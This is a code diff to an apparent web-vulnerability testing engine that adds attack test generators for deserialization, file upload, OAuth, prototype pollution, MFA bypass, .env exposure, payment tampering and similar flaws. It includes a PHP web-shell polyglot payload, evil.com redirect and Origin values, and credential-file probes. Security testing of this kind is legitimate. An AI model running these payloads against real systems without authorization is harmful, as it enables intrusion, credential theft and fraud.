@@ -12,20 +12,15 @@ import json
 import re
 import subprocess
 import time
+import urllib.error
 import urllib.parse
+import urllib.request
 from dataclasses import dataclass, field
 from pathlib import Path
 
 from path_manager import resolve_output_dir
 from typing import Any, Optional
 from concurrent.futures import ThreadPoolExecutor, as_completed
-
-try:
-    import urllib.request
-    import urllib.error
-    _HAS_URLLIB = True
-except ImportError:
-    _HAS_URLLIB = False
 
 
 # ── Data models ───────────────────────────────────────────────────────────────
@@ -246,6 +241,18 @@ class CustomTestEngine:
             "Laravel .env File Exposure":    self._gen_laravel_env_tests,
             "Spring Boot Actuator Exposure": self._gen_spring_tests,
             "PHP Object Injection":          self._gen_php_obj_tests,
+            # New OWASP coverage
+            "Insecure Deserialization":      self._gen_deserialization_tests,
+            "Race Condition":                self._gen_race_condition_tests,
+            "Insecure File Upload":          self._gen_file_upload_tests,
+            "OAuth/OIDC Vulnerability":      self._gen_oauth_vuln_tests,
+            "Prototype Pollution":           self._gen_prototype_pollution_tests,
+            "Clickjacking":                  self._gen_clickjacking_tests,
+            "PII Exposure in API Response":  self._gen_pii_exposure_tests,
+            "MFA/2FA Bypass":                self._gen_mfa_bypass_tests,
+            "WebSocket Security Issue":      self._gen_websocket_tests,
+            "Exposed JavaScript Source Map": self._gen_source_map_tests,
+            "Payment/Price Tampering":       self._gen_payment_tampering_tests,
         }
 
         gen_fn = gen_map.get(theory.vuln_type)
@@ -912,6 +919,251 @@ class CustomTestEngine:
                 expected_indicator="500 error or changed behavior after malformed object",
                 severity="critical",
                 tool_args={"note": "Use phpggc to generate gadget chain for detected framework"},
+            ),
+        ]
+
+    def _gen_deserialization_tests(self, theory) -> list[AttackTest]:
+        return [
+            AttackTest(
+                test_id=f"{theory.theory_id}_deser_java",
+                theory_id=theory.theory_id,
+                vuln_type=theory.vuln_type,
+                endpoint=theory.endpoint,
+                method="POST",
+                headers={"Content-Type": "application/x-java-serialized-object"},
+                description="Java deserialization: send magic bytes rO0AB probe; watch for timing/error change",
+                expected_indicator=">3s response time or 500 error with stack trace",
+                severity="critical",
+                tool_args={"note": "Use ysoserial to generate gadget chains for detected framework"},
+            ),
+            AttackTest(
+                test_id=f"{theory.theory_id}_deser_php",
+                theory_id=theory.theory_id,
+                vuln_type=theory.vuln_type,
+                endpoint=theory.endpoint,
+                method="GET",
+                params={"data": "O:8:\"stdClass\":0:{}"},
+                description="PHP unserialize: inject serialized stdClass in query param",
+                expected_indicator="500 error or changed response behavior",
+                severity="critical",
+            ),
+        ]
+
+    def _gen_race_condition_tests(self, theory) -> list[AttackTest]:
+        return [
+            AttackTest(
+                test_id=f"{theory.theory_id}_race_concurrent",
+                theory_id=theory.theory_id,
+                vuln_type=theory.vuln_type,
+                endpoint=theory.endpoint,
+                method="POST",
+                description="Race condition: send 25 concurrent identical requests to state-changing endpoint",
+                expected_indicator="Multiple success responses (200/201) — indicates no mutex/atomic check",
+                severity="high",
+                tool_args={"repeat": 25, "concurrent": True},
+            ),
+        ]
+
+    def _gen_file_upload_tests(self, theory) -> list[AttackTest]:
+        return [
+            AttackTest(
+                test_id=f"{theory.theory_id}_upload_php_jpeg",
+                theory_id=theory.theory_id,
+                vuln_type=theory.vuln_type,
+                endpoint=theory.endpoint,
+                method="POST",
+                headers={"Content-Type": "multipart/form-data"},
+                description="File upload bypass: PHP payload with JPEG magic bytes (FFD8FF)",
+                expected_indicator="200 OK with file URL in response — confirms server-side exec risk",
+                severity="critical",
+                tool_args={"note": "Use GIF89a; <?php system($_GET['cmd']); ?> as polyglot payload"},
+            ),
+            AttackTest(
+                test_id=f"{theory.theory_id}_upload_double_ext",
+                theory_id=theory.theory_id,
+                vuln_type=theory.vuln_type,
+                endpoint=theory.endpoint,
+                method="POST",
+                description="File upload bypass: double extension shell.php.jpg",
+                expected_indicator="File accessible via URL with .php.jpg extension",
+                severity="critical",
+            ),
+        ]
+
+    def _gen_oauth_vuln_tests(self, theory) -> list[AttackTest]:
+        return [
+            AttackTest(
+                test_id=f"{theory.theory_id}_oauth_state",
+                theory_id=theory.theory_id,
+                vuln_type=theory.vuln_type,
+                endpoint=theory.endpoint,
+                method="GET",
+                params={"state": ""},
+                description="OAuth CSRF: initiate flow without state parameter",
+                expected_indicator="Authorization proceeds without state validation (CSRF risk)",
+                severity="high",
+            ),
+            AttackTest(
+                test_id=f"{theory.theory_id}_oauth_redirect",
+                theory_id=theory.theory_id,
+                vuln_type=theory.vuln_type,
+                endpoint=theory.endpoint,
+                method="GET",
+                params={"redirect_uri": "https://evil.com/callback"},
+                description="OAuth open redirect: inject external redirect_uri",
+                expected_indicator="Redirect to evil.com — confirms redirect_uri not validated",
+                severity="critical",
+            ),
+        ]
+
+    def _gen_prototype_pollution_tests(self, theory) -> list[AttackTest]:
+        return [
+            AttackTest(
+                test_id=f"{theory.theory_id}_proto_get",
+                theory_id=theory.theory_id,
+                vuln_type=theory.vuln_type,
+                endpoint=theory.endpoint,
+                method="GET",
+                params={"__proto__[polluted]": "true"},
+                description="Prototype pollution via GET param __proto__[polluted]=true",
+                expected_indicator="Response reflects 'polluted' property or changed behavior",
+                severity="high",
+            ),
+            AttackTest(
+                test_id=f"{theory.theory_id}_proto_post",
+                theory_id=theory.theory_id,
+                vuln_type=theory.vuln_type,
+                endpoint=theory.endpoint,
+                method="POST",
+                body='{"__proto__":{"polluted":true}}',
+                headers={"Content-Type": "application/json"},
+                description="Prototype pollution via JSON POST __proto__.polluted",
+                expected_indicator="polluted=true reflected in response or status change",
+                severity="high",
+            ),
+        ]
+
+    def _gen_clickjacking_tests(self, theory) -> list[AttackTest]:
+        return [
+            AttackTest(
+                test_id=f"{theory.theory_id}_clickjacking_headers",
+                theory_id=theory.theory_id,
+                vuln_type=theory.vuln_type,
+                endpoint=theory.endpoint,
+                method="GET",
+                description="Clickjacking: check X-Frame-Options and CSP frame-ancestors headers",
+                expected_indicator="Missing X-Frame-Options and no frame-ancestors in CSP",
+                severity="medium",
+                tool_args={"check_headers": ["X-Frame-Options", "Content-Security-Policy"]},
+            ),
+        ]
+
+    def _gen_pii_exposure_tests(self, theory) -> list[AttackTest]:
+        return [
+            AttackTest(
+                test_id=f"{theory.theory_id}_pii_scan",
+                theory_id=theory.theory_id,
+                vuln_type=theory.vuln_type,
+                endpoint=theory.endpoint,
+                method="GET",
+                headers={"Accept": "application/json"},
+                description="PII scan: inspect response for email, phone, SSN, credit card, Aadhaar, PAN patterns",
+                expected_indicator="Sensitive personal data visible in API response",
+                severity="high",
+            ),
+        ]
+
+    def _gen_mfa_bypass_tests(self, theory) -> list[AttackTest]:
+        return [
+            AttackTest(
+                test_id=f"{theory.theory_id}_mfa_null",
+                theory_id=theory.theory_id,
+                vuln_type=theory.vuln_type,
+                endpoint=theory.endpoint,
+                method="POST",
+                body='{"otp": null}',
+                headers={"Content-Type": "application/json"},
+                description="MFA bypass: submit null OTP value",
+                expected_indicator="200 OK or session token issued — MFA not enforced",
+                severity="critical",
+            ),
+            AttackTest(
+                test_id=f"{theory.theory_id}_mfa_rate",
+                theory_id=theory.theory_id,
+                vuln_type=theory.vuln_type,
+                endpoint=theory.endpoint,
+                method="POST",
+                description="MFA brute-force: 10 rapid OTP submissions — check for 429 rate limit",
+                expected_indicator="No 429 after 10 attempts — no rate limiting on MFA endpoint",
+                severity="high",
+                tool_args={"repeat": 10, "interval_ms": 200},
+            ),
+        ]
+
+    def _gen_websocket_tests(self, theory) -> list[AttackTest]:
+        return [
+            AttackTest(
+                test_id=f"{theory.theory_id}_ws_no_origin",
+                theory_id=theory.theory_id,
+                vuln_type=theory.vuln_type,
+                endpoint=theory.endpoint,
+                method="GET",
+                headers={"Origin": "https://evil.com", "Upgrade": "websocket"},
+                description="WebSocket origin validation: connect from evil.com origin",
+                expected_indicator="101 Switching Protocols accepted — missing Origin validation",
+                severity="high",
+            ),
+        ]
+
+    def _gen_source_map_tests(self, theory) -> list[AttackTest]:
+        return [
+            AttackTest(
+                test_id=f"{theory.theory_id}_source_map",
+                theory_id=theory.theory_id,
+                vuln_type=theory.vuln_type,
+                endpoint=theory.endpoint + ".map",
+                method="GET",
+                description="Source map exposure: request <endpoint>.map and common .map paths",
+                expected_indicator="200 OK with JSON source map containing original source paths",
+                severity="medium",
+            ),
+            AttackTest(
+                test_id=f"{theory.theory_id}_env_exposure",
+                theory_id=theory.theory_id,
+                vuln_type=theory.vuln_type,
+                endpoint="/.env",
+                method="GET",
+                description="Environment file exposure: probe /.env for leaked credentials",
+                expected_indicator="200 OK with APP_KEY, DB_PASSWORD, or API keys",
+                severity="critical",
+            ),
+        ]
+
+    def _gen_payment_tampering_tests(self, theory) -> list[AttackTest]:
+        return [
+            AttackTest(
+                test_id=f"{theory.theory_id}_payment_neg",
+                theory_id=theory.theory_id,
+                vuln_type=theory.vuln_type,
+                endpoint=theory.endpoint,
+                method="POST",
+                body='{"amount": -1, "price": -0.01}',
+                headers={"Content-Type": "application/json"},
+                description="Payment tampering: submit negative amount/price values",
+                expected_indicator="200 OK or credit applied — server accepts negative values",
+                severity="critical",
+            ),
+            AttackTest(
+                test_id=f"{theory.theory_id}_payment_zero",
+                theory_id=theory.theory_id,
+                vuln_type=theory.vuln_type,
+                endpoint=theory.endpoint,
+                method="POST",
+                body='{"amount": 0, "price": 0.001}',
+                headers={"Content-Type": "application/json"},
+                description="Payment tampering: submit zero/minimal price",
+                expected_indicator="Order processed at zero cost",
+                severity="critical",
             ),
         ]
 
